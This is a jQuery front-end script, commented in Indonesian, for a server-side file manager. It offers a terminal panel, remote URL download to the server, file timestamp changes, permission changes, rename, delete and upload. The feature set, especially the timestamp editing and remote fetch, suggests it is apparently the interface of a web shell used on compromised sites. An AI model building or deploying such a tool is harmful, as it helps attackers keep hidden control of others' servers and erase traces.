$(document).ready(function () {
  // Modal
  var modal = $("#myModal");
  function closeModal() {
    $(modal).animate(
      {
        opacity: 0,
      },
      300,
      function () {
        modal.remove();
      }
    );
  }

  $(".close-modal").on("click", function () {
    closeModal();
  });

  $(window).on("click", function (event) {
    if ($(event.target).is(modal)) {
      closeModal();
    }
  });
  // End Modal

  // Fungsi untuk menyembunyikan terminal dan menampilkan form baru
  function hideTerminalAndShowForm(formClass) {
    $(".terminal").hide(); // Menyembunyikan terminal
    $(formClass).show().siblings(".form-container").hide(); // Menampilkan form baru dan menyembunyikan form lain
  }

  // New File
  $("#btn-news-file").on("click", function () {
    hideTerminalAndShowForm(".news-files"); // Menampilkan form file baru
    closeModal(); // Menutup modal jika tombol ditekan
  });

  $("#btn-newfiles").on("click", function () {
    var fileName = $("#newfiles").val();

    if (fileName === "") {
      alert("Mohon Isi Nama File");
    } else {
      $.post("", { action: "newfiles", fileName: fileName }, function () {
        location.reload();
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
      $("#newfiles").val("");
    }
  });
  // End New File

  // New Folder
  $("#btn-news-dir").on("click", function () {
    hideTerminalAndShowForm(".news-dirs"); // Menampilkan form folder baru
    closeModal(); // Menutup modal jika tombol ditekan
  });

  $("#btn-newdirs").on("click", function () {
    var dirName = $("#newdirs").val();

    if (dirName === "") {
      alert("Mohon Isi Nama Folder");
    } else {
      $.post("", { action: "newdirs", dirName: dirName }, function () {
        location.reload();
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
      $("#newdirs").val("");
    }
  });
  // End New Folder

  // Remote Upload
  $("#btn-remote-upload").on("click", function () {
    hideTerminalAndShowForm(".remote-upload"); // Menampilkan form upload remote
    closeModal(); // Menutup modal jika tombol ditekan
  });

  $("#btn-upload-remote").on("click", function () {
    var fileUrl = $("#fileurl").val();
    var saveName = $("#savename").val();

    if (fileUrl === "") {
      alert("Mohon Isi Dengan Benar!");
    } else if (saveName === "") {
      alert("Mohon Isi Dengan Benar!");
    } else {
      $.post("", { action: "remote-upload", fileUrl: fileUrl, saveName: saveName }, function () {
        alert("File Uploaded!");
        location.reload();
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
    }
  });
  // End Remote Upload

  // Rename
  $(".rename").on("click", function () {
    var oldName = $(this).data("name");
    var newName = prompt("Rename: " + oldName, oldName);
    if (newName) {
      $.post("", { action: "rename", oldName: oldName, newName: newName }, function () {
        setTimeout(() => {
          location.reload();
        }, 1000);
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
    }
    closeModal(); // Menutup modal setelah rename
  });
  // End Rename

  // Change Date
  $(".changedate").on("click", function () {
    var itemName = $(this).val();
    var oldDate = $(this).data("date");
    var newDate = prompt("Change Date: " + itemName, oldDate);
    $.post("", { action: "changedate", itemName: itemName, oldDate: oldDate, newDate: newDate }, function () {
      setTimeout(() => {
        location.reload();
      }, 1000);
    }).fail(function () {
      alert("Terjadi kesalahan dalam mengirimkan permintaan.");
    });
    closeModal(); // Menutup modal setelah change date
  });
  // End Change Date

  // Permission
  $(".permission").on("click", function () {
    var itemName = $(this).val();
    var oldPerm = $(this).data("perm");
    var newPerm = prompt("Change Permission: " + itemName, oldPerm);
    $.post("", { action: "permission", itemName: itemName, oldPerm: oldPerm, newPerm: newPerm }, function () {
      setTimeout(() => {
        location.reload();
      }, 1000);
    }).fail(function () {
      alert("Terjadi kesalahan dalam mengirimkan permintaan.");
    });
    closeModal(); // Menutup modal setelah permission change
  });
  // End Permission

  // Delete Directory
  $(".deleteFolder").on("click", function () {
    var folderName = $(this).data("name");

    if (confirm("Apakah Anda yakin ingin menghapus folder " + folderName + "?")) {
      $.post("", { action: "delete", folderName: folderName }, function () {
        setTimeout(() => {
          location.reload();
        }, 1000);
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
    }
    closeModal(); // Menutup modal setelah delete folder
  });
  // End Delete Directory

  // Delete File
  $(".deleteFile").on("click", function () {
    var fileName = $(this).data("name");

    if (confirm("Apakah Anda yakin ingin menghapus file " + fileName + "?")) {
      $.post("", { action: "delete", fileName: fileName }, function () {
        setTimeout(() => {
          location.reload();
        }, 1000);
      }).fail(function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      });
    }
    closeModal(); // Menutup modal setelah delete file
  });
  // End Delete File

  // Upload
  $("#bunvisup").on("change", function () {
    var formData = new FormData($("#form-upload")[0]);

    $.ajax({
      url: $("#form-upload").attr("action"),
      type: "POST",
      data: formData,
      contentType: false,
      processData: false,
      success: function () {
        alert("File Uploaded!");
        location.reload();
      },
      error: function () {
        alert("Terjadi kesalahan dalam mengirimkan permintaan.");
      },
    });
    closeModal(); // Menutup modal setelah upload
  });
  // End Upload
});
